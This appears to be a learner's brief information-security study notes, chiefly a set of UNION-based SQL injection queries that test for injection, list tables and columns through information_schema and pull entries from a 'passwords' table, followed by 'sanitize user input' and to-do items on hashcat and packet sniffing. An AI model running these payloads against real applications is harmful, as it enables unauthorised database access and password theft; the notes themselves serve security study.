# info sec notes

## SQL
use everything after (including) "a' UNION"
* test if injection is possible
    ```sql
    SELECT first_name, last_name FROM user WHERE first_name like '%a' UNION (SELECT 1, 2 FROM dual); -- ';
    ```

* get all tables from database
    ```sql
    SELECT first_name, last_name FROM user WHERE first_name like '%a' UNION (SELECT table_name, table_schema FROM information_schema.tables); -- ';
    ```
* get column names from specific table password, use 2 as placeholde to fill in coumn to union correctly
    ```sql
    SELECT first_name, last_name FROM user WHERE first_name like '%a' UNION (SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 'passwords'); -- ';
    ```

* get passwords from password table
    ```sql
    SELECT first_name, last_name FROM user WHERE first_name like '%a' UNION (SELECT password, 2 FROM passwords); -- ';
    ```

* information_schema table holds information of all tables


**solution: sanitize user input**

todo lean second order injection

## password cracking

* use hashcat
* learn md5, sha-256
* learn bruteforce attack, dictionary attack

## networking

* learn package sniffing
* lean package modification

## bash scripting

* learn bash scripting